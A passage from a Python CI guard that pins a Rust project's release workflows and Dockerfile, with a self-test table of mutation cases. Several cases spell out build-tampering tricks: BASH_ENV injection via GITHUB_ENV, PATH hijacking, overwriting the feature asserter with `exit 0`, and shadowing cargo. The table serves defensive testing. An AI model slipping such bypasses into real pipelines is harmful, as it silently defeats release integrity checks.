    got = max(runs, key=lambda r: len(set(r.split("; ")) & set(want)))
    return "nearest builder RUN: " + first_diff(tuple(got.split("; ")), want)


def check_dockerfile(text: str, rep: Report) -> None:
    check_no_bash_env("Dockerfile", text, rep)
    raw = text.split("\n")
    if raw[0] != DOCKER_SYNTAX:
        rep.bad(f"Dockerfile: line 1 must be exactly `{DOCKER_SYNTAX}` (the syntax directive picks the frontend that "
                f"parses the file): {raw[0][:60]}" + pin_hint("DOCKER_SYNTAX"))
    for n, ln in enumerate(raw[1:], 2):
        if DIRECTIVE_RE.match(ln):
            rep.bad(f"Dockerfile: line {n}: a parser directive other than the pinned line-1 syntax (an `escape` "
                    f"directive changes what a line continuation is): {ln.strip()[:60]}")
    stages: List[Tuple[Optional[str], List[str]]] = []
    names: Dict[str, int] = {}
    spans = bk_instructions(raw)
    canon_lines: set = set()
    for first, last, ins in spans:
        if ins == DOCKER_RUN:
            if tuple(raw[first - 1:last]) == DOCKER_RUN_LINES:
                canon_lines.update(range(first, last + 1))
            else:
                rep.bad(pin_message("Dockerfile", f"line {first}: the build RUN is not written exactly as the pinned "
                                    "physical lines (compared line by line, no comment or blank line inside)",
                                    "DOCKER_RUN_LINES"))
    for n in continued_lines(raw):
        if n not in canon_lines:
            rep.bad(f"Dockerfile: line {n}: a line ending in `\\` outside the canonical build RUN (DOCKER_RUN_LINES in "
                    f"{GUARD_PATH}); continuations are refused everywhere else: {raw[n - 1].strip()[:60]}")
    for _, _, ins in spans:
        word = ins.split(" ", 1)[0].upper()
        if "--mount" in ins.lower():
            rep.bad(f"Dockerfile: `--mount` refused (a mount can overlay or import files the guard never read): {ins[:60]}")
        if "<<" in ins:
            rep.bad(f"Dockerfile: heredoc (`<<`) refused, the guard cannot see what it runs: {ins[:60]}")
        if word not in DOCKER_INSTRUCTIONS:
            rep.bad(f"Dockerfile: `{word}` refused (SHELL swaps the shell of the build RUN; ONBUILD and unknown "
                    f"instructions are outside the subset): {ins[:60]}")
            continue
        if word == "FROM":
            m = FROM_RE.fullmatch(ins)
            if m is None:
                rep.bad(f"Dockerfile: FROM outside `FROM [--platform=x] image [AS name]`: {ins[:80]}")
                toks = ins.split(" ")
                image, name = (toks[1] if len(toks) > 1 else ""), None
            else:
                image, name = m.group("image"), m.group("name")
            if "$" in image:
                rep.bad(f"Dockerfile: FROM image `{image}` is a variable; a stage must start FROM a literal base image "
                        f"(the guard cannot resolve it): {ins[:60]}")
            if image.lower() in names:
                rep.bad(f"Dockerfile: `{ins[:60]}` starts a stage FROM an earlier stage (a stage starts from a base image)")
            if name is not None:
                if name.lower() in names:
                    rep.bad(f"Dockerfile: duplicate stage name `{name}`")
                names.setdefault(name.lower(), len(stages))
            stages.append((name, []))
            continue
        if not stages:
            if word != "ARG":
                rep.bad(f"Dockerfile: `{word}` before the first FROM: {ins[:60]}")
            continue
        stages[-1][1].append(ins)
    final = stages[-1][1] if stages else []
    copies = [m.group("stage").lower() for m in (BINARY_COPY_RE.fullmatch(i) for i in final) if m]
    if len(copies) != 1:
        rep.bad("Dockerfile: the final stage must COPY the binary exactly once: "
                "`COPY --from=<stage> /build/target/release/ai-memory /usr/local/bin/ai-memory`")
    src = copies[0] if copies else ""
    for ins in final:
        m = FROM_FLAG_RE.search(ins)
        if m is not None and m.group("src").lower() != src:
            rep.bad(f"Dockerfile: final-stage `{ins[:60]}` takes `--from={m.group('src')}`; only the stage that "
                    "builds the binary may feed the image")
    bidx = names.get(src)
    if bidx is None or bidx == len(stages) - 1:
        rep.bad(f"Dockerfile: the final image copies the binary from `{src}`, which is not an earlier named stage")
        return
    for k, (_, body) in enumerate(stages):
        for pos, ins in enumerate(body):
            canon = k == bidx and pos == len(body) - 1 and ins == DOCKER_RUN
            if BUILD_TOOL_RE.search(unquoted(ins)) and not canon:
                rep.bad(f"Dockerfile: a build tool outside the canonical build RUN (the last instruction of the stage the "
                        f"image copies the binary from): {ins[:80]}")
    builder = stages[bidx][1]
    for ins in builder:
        if FROM_FLAG_RE.search(ins):
            rep.bad(f"Dockerfile: the builder stage takes `--from` another stage or image: {ins[:60]}")
    if DOCKER_LOCK_COPY not in builder[:-2]:
        rep.bad(f"Dockerfile: the builder stage does not `{DOCKER_LOCK_COPY}` before the build" + pin_hint("DOCKER_LOCK_COPY"))
    if builder[-2:-1] != [DOCKER_DECL_COPY]:
        rep.bad(f"Dockerfile: the builder stage must `{DOCKER_DECL_COPY}` immediately before the build RUN"
                + pin_hint("DOCKER_DECL_COPY"))
    if builder[-1:] != [DOCKER_RUN]:
        rep.bad("Dockerfile: the builder stage must END with exactly the allowed build+assert RUN (nothing after it); "
                + docker_nearest(builder) + pin_hint("DOCKER_RUN"))


def check_inline_use(name: str, text: str, rep: Report) -> None:
    """Every use of the declaration is its own assignment (a failing declaration
    inside a substitution in another command would be swallowed)."""
    for ln in logical_lines(text.split("\n")):
        stripped = ln.replace(ALLOWED_FEATURES, "").replace(ALLOWED_REQUIRE, "")
        if INLINE_USE_RE.search(stripped):
            rep.bad(f"{name}: inline use of the declaration (a failure would be swallowed; assign it in its own statement): {ln[:80]}")


def _shape_norm(lines: Tuple[str, ...]) -> Tuple[str, ...]:
    """The proof statements with the TLS URL assignment (any port) replaced by its placeholder."""
    if len(lines) == len(SHAPE_PROOF) and SHAPE_URL_RE.fullmatch(lines[1]):
        return (lines[0], SHAPE_PROOF_URL, lines[2])
    return lines


def check_shape(text: str, rep: Report, advisory: Optional[bool] = None) -> None:
    """release-shape.yml is pinned as a skeleton (#4719 SR-10): top-level keys,
    `on:`, `permissions:` and `env:` values, the one job's keys and values, and
    the build and proof units inside it. ``advisory`` defaults to SHAPE_ADVISORY."""
    if advisory is None:
        advisory = SHAPE_ADVISORY
    check_no_bash_env("release-shape.yml", text, rep)
    doc = parse_yaml(text, "release-shape.yml", rep)
    if doc is None:
        return
    check_blocks(doc, "release-shape.yml", rep)
    check_run_continuations(doc, "release-shape.yml", rep)
    check_uses_pinned(doc, "release-shape.yml", rep)
    if doc.keys() != list(SHAPE_TOP_KEYS):
        rep.bad(pin_message("release-shape.yml", f"top-level keys {doc.keys()} differ from the pinned "
                            f"{list(SHAPE_TOP_KEYS)} (a top-level `defaults:` or `env:` change redirects every step)",
                            "SHAPE_TOP_KEYS"))
    for key, spec, const in (("on", SHAPE_ON, "SHAPE_ON"), ("permissions", SHAPE_PERMISSIONS, "SHAPE_PERMISSIONS"),
                             ("env", SHAPE_ENV, "SHAPE_ENV")):
        why = pin_problem(doc.get(key), spec, key)
        if why:
            rep.bad(pin_message("release-shape.yml", why, const))
    jobs = doc.get("jobs")
    if jobs is None or jobs.kind != "map" or jobs.keys() != ["release-shape"]:
        rep.bad("release-shape.yml: `jobs:` must be exactly the one `release-shape:` job" + pin_hint("SHAPE_JOB"))
    job = jobs.get("release-shape") if jobs is not None else None
    if not want_kind(job, "map", "release-shape.yml `jobs.release-shape`", rep) or job is None:
        return
    want_keys = set(SHAPE_JOB) | {"steps"}
    if set(job.keys()) - {"continue-on-error"} != want_keys:
        extra = sorted(set(job.keys()) - want_keys - {"continue-on-error"})
        rep.bad(pin_message("release-shape.yml", f"`jobs.release-shape` keys {job.keys()} differ from the pinned set "
                            f"(extra {extra}, missing {sorted(want_keys - set(job.keys()))}; `needs:`, `if:`, `env:`, "
                            "`defaults:`, `container:` or `services:` can skip or redirect the proof)", "SHAPE_JOB"))
    for key, spec in SHAPE_JOB.items():
        why = pin_problem(job.get(key), spec, f"jobs.release-shape.{key}")
        if why:
            rep.bad(pin_message("release-shape.yml", why, "SHAPE_JOB"))
    coe = job.get("continue-on-error")
    if advisory:
        why = pin_problem(coe, "true", "jobs.release-shape.continue-on-error")
        if why:
            rep.bad(f"release-shape.yml: {why}; while SHAPE_ADVISORY is True in {GUARD_PATH} (#4480) the job carries "
                    "exactly the plain `continue-on-error: true`")
    elif coe is not None:
        rep.bad(f"release-shape.yml: `jobs.release-shape.continue-on-error` is set but SHAPE_ADVISORY is False in "
                f"{GUARD_PATH} (#4720: the job is required, a failing proof must fail the run)")
    steps = job_steps(job, "release-shape.yml release-shape job", rep)
    builds = one_unit(steps, KEYS_SHELL, SHAPE_BUILD, "release-shape.yml: the `release-shape:` job build", rep,
                      "SHAPE_BUILD")
    proofs = one_unit(steps, KEYS_SHELL, SHAPE_PROOF, "release-shape.yml: the `release-shape:` job pg proof "
                      "(an executing `bash scripts/release-shape-pg-proof.sh` run step; the `paths:` filter does not count)",
                      rep, "SHAPE_PROOF", _shape_norm)
    if builds and proofs and proofs[0] < builds[0]:
        rep.bad("release-shape.yml: the pg proof must run after the release-shaped build, in the same job")
    # #6290: the whole ordered step list is pinned (SHAPE_STEPS).
    items = [st for _, st in steps]
    raw = job.get("steps")
    if raw is None or raw.kind != "seq" or not isinstance(raw.value, list) or len(items) != len(raw.value):
        rep.bad(pin_message("release-shape.yml", "`jobs.release-shape.steps` is missing, not a sequence or holds a "
                            "non-mapping step", "SHAPE_STEPS"))
        return
    if len(items) != len(SHAPE_STEPS):
        rep.bad(pin_message("release-shape.yml", f"the release-shape job has {len(items)} steps, the pinned list has "
                            f"{len(SHAPE_STEPS)} (an extra step can replace the proven binary or the proof script; a "
                            "missing one skips a control)", "SHAPE_STEPS"))
        return
    units = {"build": builds, "proof": proofs}
    for n, (step, spec) in enumerate(zip(items, SHAPE_STEPS)):
        if isinstance(spec, Unit):
            if units[str(spec)] != [n]:
                rep.bad(pin_message("release-shape.yml", f"`jobs.release-shape.steps.{n + 1}` must be the {spec} unit "
                                    f"({SHAPE_STEP_ROLES[n]}); the proof runs after the build, in the same job",
                                    "SHAPE_STEPS"))
            continue
        why = pin_problem(step, spec, f"jobs.release-shape.steps.{n + 1} ({SHAPE_STEP_ROLES[n]})")
        if why:
            rep.bad(pin_message("release-shape.yml", why + " (#6290: no step may carry an unpinned `if:`, "
                                "`continue-on-error:` or `timeout-minutes:`)", "SHAPE_STEPS"))


def check_install(text: str, rep: Report) -> None:
    m = re.search(r"^## Pre-built Binaries.*?(?=^## (?!Pre-built Binaries))", text, re.M | re.S)
    section = m.group(0) if m else ""
    if "sal-postgres" not in section:
        rep.bad("docs/INSTALL.md 'Pre-built Binaries' does not name sal-postgres")
    if "daemon path is NOT" in section or "requires a `--features sal,sal-postgres` source build" in section:
        rep.bad("docs/INSTALL.md still says the postgres path needs a source build")


def run_guard(root: Path, advisory: Optional[bool] = None) -> Tuple[List[str], str]:
    rep = Report()
    rep.root = root
    feat = load(root / "scripts" / "release-features.sh", "scripts/release-features.sh", rep, False)
    rel = load(root / ".github" / "workflows" / "release.yml", ".github/workflows/release.yml", rep, True)
    shape = load(root / ".github" / "workflows" / "release-shape.yml", ".github/workflows/release-shape.yml (no release-shaped proof)", rep, True)
    c8 = load(root / ".github" / "workflows" / "c8-precheck.yml", ".github/workflows/c8-precheck.yml (#8002)", rep, True)
    publish = load(root / ".github" / "workflows" / "publish-ci-image.yml", ".github/workflows/publish-ci-image.yml (#8020)", rep, True)
    docker = load(root / "Dockerfile", "Dockerfile", rep, True)
    install = load(root / "docs" / "INSTALL.md", "docs/INSTALL.md", rep, False)

    declared = ""
    if feat is not None:
        try:
            proc = subprocess.run(
                ["bash", str(root / "scripts" / "release-features.sh")], capture_output=True, text=True, check=False, timeout=60
            )
            declared = proc.stdout.strip()
            if proc.returncode != 0:
                rep.bad(f"release-features.sh exited {proc.returncode}")
        except (OSError, ValueError, subprocess.TimeoutExpired) as exc:
            raise InputError(f"cannot run release-features.sh: {exc}") from exc
        if "sal-postgres" not in declared.split(","):
            rep.bad(f"release-features.sh declares [{declared}], without sal-postgres")

    for name, text in (("release.yml", rel), ("release-shape.yml", shape), ("Dockerfile", docker)):
        if text is not None:
            check_inline_use(name, text, rep)
    if rel is not None:
        check_release_yml(rel, rep)
    if docker is not None:
        check_dockerfile(docker, rep)
    for wf_name, wf_text in (("c8-precheck.yml", c8), ("publish-ci-image.yml", publish)):
        if wf_text is not None:
            wf_doc = parse_yaml(wf_text, wf_name, rep)
            if wf_doc is not None:
                check_uses_pinned(wf_doc, wf_name, rep)
    if shape is not None:
        check_shape(shape, rep, advisory)
    if install is not None:
        check_install(install, rep)
    return rep.errors, declared


# --------------------------------------------------------------- self-test --
Transform = Callable[[str], str]
Edit = Tuple[str, str, Union[str, None, Transform], bool]  # (file, old, new | None=delete | fn, every)
REL = ".github/workflows/release.yml"
SHAPE = ".github/workflows/release-shape.yml"
DOCKER = "Dockerfile"
INSTALL = "docs/INSTALL.md"
DECL = "scripts/release-features.sh"
C8 = ".github/workflows/c8-precheck.yml"
PUBLISH = ".github/workflows/publish-ci-image.yml"
INPUT_FILES = (REL, SHAPE, C8, PUBLISH, DOCKER, INSTALL, DECL)


def mutate_file(path: Path, old: str, new: Union[str, None, Transform], every: bool = False) -> None:
    """Apply one edit. ``new`` None deletes the file, a callable transforms the
    whole text, an empty ``old`` overwrites the file (surrogateescape bytes)."""
    if new is None:
        path.unlink()
        return
    if callable(new):
        path.write_text(new(path.read_text(encoding="utf-8")), encoding="utf-8")
        return
    if old == "":
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(new.encode("utf-8", "surrogateescape"))
        return
    text = path.read_text(encoding="utf-8")
    if old not in text:
        raise RuntimeError(f"mutation anchor missing in {path.name}: {old[:60]!r}")
    path.write_text(text.replace(old, new) if every else text.replace(old, new, 1), encoding="utf-8")


def mk_root(src: Path, dst: Path) -> None:
    if dst.exists():
        shutil.rmtree(dst)
    for rel in INPUT_FILES:
        (dst / rel).parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(src / rel, dst / rel)


IND = "          "
ASSIGN = IND + ALLOWED_FEATURES + "\n"
REL_BUILD = ASSIGN + IND + 'test -n "$FEATURES"\n' + IND + BUILD_CMD
REL_BUILD_CMD = IND + BUILD_CMD
REL_ASSERT = IND + ASSERT_WORKFLOW
BIN_LINE = IND + ALLOWED_BIN
ASSERT_NAME = "      - name: Assert compiled features (#2676, #2728)\n"
ASSERT_HDR = ASSERT_NAME + "        shell: bash\n"
ASSERT_RUN = ASSERT_HDR + "        run: |\n"
BUILD_HDR = "      - name: Build release binary\n"
BUILD_SHELL = "        shell: bash\n        run: |\n          set -euo pipefail\n"
SBOM_HDR = "      - name: Generate CycloneDX SBOM (JSON)\n"
SBOM_LINE = IND + SBOM_CMD
PKG_HDR = "      - name: Package binary\n"
JOB_NAME = "    name: Release (${{ matrix.target }})\n"
DOCKER_BUILD = SHAPE_BUILD_CMD + "; \\"
DOCKER_ASSERT = "    " + ASSERT_DOCKER
DOCKER_RUN_HEAD = "RUN set -eu; \\\n"
SHAPE_HDR = "      - name: Build release binary (exactly as release.yml)\n"
SHAPE_LINE = IND + SHAPE_BUILD_CMD


def _rel(old: str, new: Union[str, Transform], every: bool = False) -> Edit:
    return (REL, old, new, every)


def _hdr_key(hdr: str, key: str) -> List[Edit]:
    """Add a step-level YAML key to a release.yml step header."""
    return [_rel(hdr, hdr + "        " + key + "\n")]


def _before_assert(stmt: str) -> List[Edit]:
    return [_rel(REL_ASSERT, stmt + "\n" + REL_ASSERT)]


def _before_build(stmt: str) -> List[Edit]:
    return [_rel(ASSIGN, stmt + "\n" + ASSIGN)]


def _move_assert_before_build(text: str) -> str:
    a, p, b = text.index(ASSERT_NAME), text.index(PKG_HDR), text.index(BUILD_HDR)
    block = text[a:p]
    text = text[:a] + text[p:]
    return text[:b] + block + text[b:]


def _move_assert_to_other_job(text: str) -> str:
    a, p = text.index(ASSERT_NAME), text.index(PKG_HDR)
    block = text[a:p]
    text = text[:a] + text[p:]
    return text.rstrip("\n") + "\n\n  verify-elsewhere:\n    runs-on: ubuntu-latest\n    steps:\n" + block


def _drop_assert_step(text: str) -> str:
    a, p = text.index(ASSERT_NAME), text.index(PKG_HDR)
    return text[:a] + text[p:]


NEEDS_REL = "    needs: [preflight, qualify, supply-chain]\n    runs-on: ${{ matrix.os }}\n"
MATRIX_FF = "      fail-fast: false\n"
ENTRY1 = "          - target: x86_64-unknown-linux-gnu\n            os: ubuntu-latest\n            artifact: ai-memory\n"
SBOM_JOB = "  sbom:\n    name: SBOM (CycloneDX)\n"
PUSH_WITH = "        with:\n          context: .\n"
D_BUILDER = "FROM rust:1.98-slim-bookworm AS builder\n"
D_FINAL = "FROM debian:bookworm-slim\n"
D_WORKDIR = "WORKDIR /build\n"
D_LOCK = DOCKER_LOCK_COPY + "\n"
D_BIN = "COPY --from=builder /build/target/release/ai-memory /usr/local/bin/ai-memory\n"
SHAPE_JOB_HDR = "\n  release-shape:\n"


def _docker(old: str, new: Union[str, Transform], every: bool = False) -> Edit:
    return (DOCKER, old, new, every)


def _step_before_pkg(body: str) -> List[Edit]:
    """A new release-job step (after the strict assert)."""
    return [_rel(PKG_HDR, "      - name: extra\n" + body + PKG_HDR)]


def _append_job(body: str) -> Transform:
    return lambda t: t.rstrip("\n") + "\n\n  decoy:\n    runs-on: ubuntu-latest\n    steps:\n" + body


def _move_sbom_to_decoy(text: str) -> str:
    a = text.index(SBOM_HDR)
    b = text.index("      - name:", a + len(SBOM_HDR))
    block = text[a:b]
    return _append_job(block)(text[:a] + text[b:])


def _dead_stage_then_alter(text: str) -> str:
    """D1: a dead stage holds the canonical RUN while the shipped builder changes."""
    a, b = text.index(D_BUILDER), text.index(D_FINAL)
    dead = text[a:b].replace(" AS builder", " AS decoy")
    live = text[a:b].replace("strip target/release/ai-memory", "true")
    return text[:a] + dead + live + text[b:]


BUILD_IMG_NAME = "      - name: Build and push Docker image\n"
ATTEST_NAME = "      - name: Attest build provenance (Docker image)\n"
PUSH_USES = "        uses: " + IMAGE_BUILD_USES + " # v6\n"
BUILDX_STEP = "      - name: Set up Docker Buildx\n        uses: " + BUILDX_USES + " # v3\n"
LOGIN_NAME = "      - name: Log in to GitHub Container Registry\n"
PUSH_CACHE = "          cache-from: type=gha\n          cache-to: type=gha,mode=max\n"
PUSH_TAGS = "          tags: |\n"
PUSH_LABELS = "          labels: |\n"
SHAPE_PROOF_LINE = "          " + SHAPE_PROOF_CMD
PROOF_NAME = "      - name: Prove the shipped binary reports sal-postgres and uses the tier over verify-full\n"
SHAPE_BUILD_NAME = "      - name: Build release binary (exactly as release.yml)\n"


def _image_step(text: str) -> str:
    a = text.index(BUILD_IMG_NAME)
    return text[a:text.index(ATTEST_NAME, a)]


def _drop_image_with(text: str) -> str:
    step = _image_step(text)
    return text.replace(step, step[: step.index(PUSH_WITH)], 1)


def _image_with_scalar(text: str) -> str:
    step = _image_step(text)
    return text.replace(step, step[: step.index(PUSH_WITH)] + "        with: none\n", 1)


def _second_image_build(text: str) -> str:
    step = _image_step(text)
    return text.replace(step, step + step, 1)


def _image_build_in_sbom_job(text: str) -> str:
    step = _image_step(text)
    return text.replace(step, "", 1).replace(SBOM_HDR, step + SBOM_HDR, 1)


def _image_build_copy_in_sbom_job(text: str) -> str:
    return text.replace(SBOM_HDR, _image_step(text) + SBOM_HDR, 1)


def _swap_cache_order(text: str) -> str:
    return text.replace(PUSH_CACHE, "          cache-to: type=gha,mode=max\n          cache-from: type=gha\n", 1)


def _reusable_builder_job(text: str) -> str:
    return text.rstrip("\n") + "\n\n  builder:\n    uses: docker/build-push-action/.github/workflows/x.yml@v6\n"


def _proof_before_build(text: str) -> str:
    b = text.index(PROOF_NAME)
    step = text[b:text.index("      - name: Stop the PostgreSQL service", b)]
    return text.replace(step, "", 1).replace(SHAPE_BUILD_NAME, step + SHAPE_BUILD_NAME, 1)


def _drop_proof_step(text: str) -> str:
    b = text.index(PROOF_NAME)
    return text.replace(text[b:text.index("      - name: Stop the PostgreSQL service", b)], "", 1)


def _d(old: str, new: str) -> Edit:
    return _docker(old, new)


DOCKER_HDR = "\n  docker:\n    name: Docker (GHCR)\n"
DOCKER_HEAD = ("needs: [preflight, qualify, supply-chain]\n    if: needs.preflight.outputs.is_prerelease == 'false'\n"
               "    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n")
CRATES_STEPS = ("    # CARGO_REGISTRY_TOKEN is scoped to the `release` Environment (#3546 D4).\n"
                "    environment: release\n    steps:\n")
COPR_HDR = "  copr:\n    name: Fedora COPR\n"
LOGIN_PW = "          password: ${{ secrets.GITHUB_TOKEN }}\n"
SHAPE_NAME = '    name: "Release-shaped build + PG TLS proof"\n'
REL_PERMS = "      id-token: write\n      attestations: write\n    strategy:\n"


def _docker_extra_step(body: str) -> List[Edit]:
    """A new docker-job step before the image build."""
    return [_rel(BUILD_IMG_NAME, "      - name: extra\n" + body + BUILD_IMG_NAME)]


def _docker_step_last(text: str) -> str:
    """An extra docker-job step after the provenance attestation (the last pinned step)."""
    c = text.index("\n  copr:\n")
    return text[:c].rstrip("\n") + "\n      - name: extra\n        run: echo done\n\n" + text[c:]


def _docker_job_scalar(text: str) -> str:
    a, c = text.index("\n  docker:\n"), text.index("\n  copr:\n")
    return text[:a] + "\n  docker: none\n" + text[c:]


def _docker_steps_scalar(text: str) -> str:
    a, c = text.index("\n  docker:\n"), text.index("\n  copr:\n")
    s = text.index("    steps:\n", a)
    return text[:s] + "    steps: none\n" + text[c:]


def _job_edit(job: str, fn: Callable[[str], str]) -> Transform:
    """A Transform that rewrites only the body of workflow job ``job`` (#8023 cells)."""
    def go(text: str) -> str:
        m = re.search(r"(?m)^  " + re.escape(job) + r":\n(?:(?!^  [A-Za-z0-9_-]+:\n).*\n?)*", text)
        if m is None:
            raise InputError(f"self-test: job {job} not found")
        return text[:m.start()] + fn(m.group(0)) + text[m.end():]
    return go


_SHA_USES_RE = re.compile(r"(uses:\s*[A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@)[0-9a-f]{40}")


def _first_use_to_tag(text: str) -> str:
    """Repoint the first pinned `uses:` of a workflow to the mutable tag v4 (#6904)."""
    return _SHA_USES_RE.sub(r"\g<1>v4", text, count=1)


def _first_checkout_to_other_sha(text: str) -> str:
    """Repin the first actions/checkout to another valid 40-hex sha (#8030)."""
    return re.sub(r"(uses:\s*actions/checkout@)[0-9a-f]{40}", r"\g<1>" + "0" * 40, text, count=1)


def _checkout_spelled(spelling: str, sha: str = "0" * 40) -> Callable[[str], str]:
    """Respell the first actions/checkout of a job text as ``spelling@sha`` (Round 5 F1)."""
    def go(text: str) -> str:
        return text.replace(CHECKOUT_USES, spelling + "@" + sha, 1)
    return go


def _shape_scalar_step(text: str) -> str:
    return text.rstrip("\n") + "\n      - just-a-scalar\n"


def _shape_swap_guard_build(text: str) -> str:
    a = text.index("      - name: Release feature declaration guard\n")
    b = text.index("      - name: Build release binary")
    c = text.index("      - name: No OpenSSL")
    return text[:a] + text[b:c] + text[a:b] + text[c:]


def _shape(old: str, new: Union[str, Transform]) -> Edit:
    return (SHAPE, old, new, False)


# name -> (want, edits). want: "pass" (guard accepts), "fail" (guard refuses),
# "input-error" (guard exits 2). `--mutation-sweep` neutralises every refusal
# site in turn and requires `--self-test` to go red, so each "fail" case must be
# refused by a distinct refusal, not merely by a neighbour.
CASES: Dict[str, Tuple[str, List[Edit]]] = {
    "unmutated": ("pass", []),
    "C1 multi-line build (a run continuation) is refused": ("fail", [_rel(
        REL_BUILD_CMD,
        IND + 'cargo build --locked --release \\\n            --target ${{ matrix.target }} \\\n            --features "$FEATURES"')]),
    "valid whole-line comments between statements": ("pass", [_rel(
        REL_BUILD_CMD, IND + "# a harmless whole-line comment\n" + REL_BUILD_CMD)]),
    "valid blank line inside the assert step": ("pass", [_rel(REL_ASSERT, "\n" + REL_ASSERT)]),
    "trailing comment on the build statement is refused": ("fail", [_rel(
        REL_BUILD_CMD, REL_BUILD_CMD + "  # locked build on the declared set")]),
    "trailing comment on the assert statement is refused": ("fail", [_rel(REL_ASSERT, REL_ASSERT + "  # strict exact-set")]),
    # --- issue forms (a)-(d)
    "multi-line inline use": ("fail", [_rel(
        REL_BUILD_CMD,
        IND + 'cargo build --locked --release \\\n            --target ${{ matrix.target }} \\\n'
        '            --features "$(bash scripts/release-features.sh)"')]),
    "inline use of the declaration in the release-shape tree step": ("fail", [(
        SHAPE, '--features "$FEATURES")"', '--features "$(bash scripts/release-features.sh)")"', False)]),
    "inline use through backticks in the release-shape tree step": ("fail", [(
        SHAPE, '--features "$FEATURES")"', '--features `bash scripts/release-features.sh`)"', False)]),
    "assignment only in a comment": ("fail", [_rel(
        REL_BUILD,
        IND + '# FEATURES="$(bash scripts/release-features.sh)"\n' + IND + 'FEATURES=sal\n' + REL_BUILD_CMD)]),
    "Dockerfile --locked only in a comment": ("fail", [
        (DOCKER, DOCKER_BUILD, 'cargo build --release --features "$FEATURES"; \\', False),
        (DOCKER, DOCKER_RUN_HEAD, '# cargo build --locked --release --features "$FEATURES"\n' + DOCKER_RUN_HEAD, False)]),
    "bypass (a) FEATURES reassigned before the release.yml build": ("fail", _before_build(IND + "FEATURES=sal")),
    "bypass (a) FEATURES reassigned as a command prefix": ("fail", [_rel(
        IND + "cargo build --locked --release --target ${{ matrix.target }}",
        IND + "FEATURES=sal cargo build --locked --release --target ${{ matrix.target }}")]),
    "bypass (a) FEATURES reassigned in the SBOM step": ("fail", [_rel(
        IND + ALLOWED_FEATURES + "\n" + IND + 'test -n "$FEATURES"\n' + SBOM_LINE,
        IND + ALLOWED_FEATURES + "\n" + IND + "FEATURES=sal\n" + IND + 'test -n "$FEATURES"\n' + SBOM_LINE)]),
    "bypass (b) FEATURES reassigned inside the Dockerfile RUN": ("fail", [(
        DOCKER, '    test -n "$FEATURES"; \\', '    FEATURES=sal; \\\n    test -n "$FEATURES"; \\', False)]),
    "bypass (b) FEATURES appended inside the Dockerfile RUN": ("fail", [(
        DOCKER, '    test -n "$FEATURES"; \\', '    FEATURES+=,x; \\\n    test -n "$FEATURES"; \\', False)]),
    "bypass (c) --locked dropped (release.yml)": ("fail", [_rel(
        "cargo build --locked --release --target ${{ matrix.target }}", "cargo build --release --target ${{ matrix.target }}")]),
    "bypass (c) --locked only in a trailing comment (release.yml)": ("fail", [_rel(
        REL_BUILD_CMD, REL_BUILD_CMD.replace("--locked ", "") + "  # --locked")]),
    "bypass (d) --no-default-features (release.yml)": ("fail", [_rel(REL_BUILD_CMD, REL_BUILD_CMD + " --no-default-features")]),
    "bypass (d) --all-features (release.yml)": ("fail", [_rel(REL_BUILD_CMD, REL_BUILD_CMD + " --all-features")]),
    "bypass (d) --no-default-features (Dockerfile)": ("fail", [(
        DOCKER, DOCKER_BUILD, 'cargo build --locked --release --no-default-features --features "$FEATURES"; \\', False)]),
    "hard-coded feature list": ("fail", [_rel(REL_BUILD_CMD, REL_BUILD_CMD.replace('"$FEATURES"', "sal"))]),
    "REQUIRE_FLAGS reassigned before the strict assert": ("fail", [_rel(
        IND + 'test -n "$REQUIRE_FLAGS"', IND + 'REQUIRE_FLAGS="--require sal"\n' + IND + 'test -n "$REQUIRE_FLAGS"')]),
    "Dockerfile REQUIRE_FLAGS reassigned": ("fail", [(
        DOCKER, '    test -n "$REQUIRE_FLAGS"; \\', '    REQUIRE_FLAGS="--require sal"; \\\n    test -n "$REQUIRE_FLAGS"; \\', False)]),
    "FEATURES assigned after the build (order)": ("fail", [_rel(REL_BUILD, REL_BUILD_CMD + "\n" + ASSIGN.rstrip("\n"))]),
    "eval in the build step": ("fail", _before_build(IND + 'eval "echo hi"')),
    "source in the build step": ("fail", _before_build(IND + "source ./x.sh")),
    "nameref in the build step": ("fail", _before_build(IND + "declare -n r=FEATURES")),
    "read into FEATURES with an env prefix": ("fail", _before_build(IND + "IFS=, read -r FEATURES <<< sal")),
    "mapfile into FEATURES": ("fail", _before_build(IND + "mapfile -t FEATURES < /dev/null")),
    "second build with a +toolchain (hard-coded sal)": ("fail", [_rel(
        REL_BUILD_CMD,
        REL_BUILD_CMD + "\n" + IND + "cargo +1.98.0 build --locked --release --target ${{ matrix.target }} --features sal")]),
    # --- R5 / M-forms: a second or shadowed build in the build step
    "M01 cargo shadowed by a function in the build step": ("fail", [_rel(
        REL_BUILD_CMD,
        IND + "cargo() { command cargo build --locked --release --target ${{ matrix.target }} --features sal; }\n" + REL_BUILD_CMD)]),
    "M02 second build spelled with a quoted \"cargo\"": ("fail", [_rel(
        REL_BUILD_CMD, REL_BUILD_CMD + "\n" + IND + '"cargo" build --release --target ${{ matrix.target }} --features sal')]),
    "M03 second build spelled \\cargo": ("fail", [_rel(
        REL_BUILD_CMD, REL_BUILD_CMD + "\n" + IND + "\\cargo build --release --target ${{ matrix.target }} --features sal")]),
    "M04 quoted second build plus a heredoc-hidden assert": ("fail", [
        _rel(REL_BUILD_CMD, REL_BUILD_CMD + "\n" + IND + '"cargo" build --release --target ${{ matrix.target }} --features sal'),
        _rel(REL_ASSERT, IND + "cat > /dev/null <<'EOF'\n" + REL_ASSERT + "\n" + IND + "EOF")]),
    "build step rewrites the declaration file before reading it": ("fail", _before_build(
        IND + "sed -i.bak s/sal-postgres/sal/ scripts/release-features.sh")),
    "build step restores an old declaration": ("fail", _before_build(IND + "git checkout HEAD~50 -- scripts/release-features.sh")),
    "build step overwrites the asserter script": ("fail", _before_build(IND + "printf 'exit 0' > scripts/assert-compiled-features.sh")),
    "build step exports BASH_ENV through GITHUB_ENV": ("fail", _before_build(IND + 'echo "BASH_ENV=decoy/noop.sh" >> "$GITHUB_ENV"')),
    "build step adds a fake dir to GITHUB_PATH": ("fail", _before_build(IND + 'echo "$PWD/decoy" >> "$GITHUB_PATH"')),
    "build step cd before the build": ("fail", _before_build(IND + "cd decoy")),
    "build step hash -p override": ("fail", _before_build(IND + "hash -p /usr/bin/true cargo")),
    # --- R-F1 / R5: the assert step is the exact statement list
    "N01 assert inside a heredoc body": ("fail", [_rel(
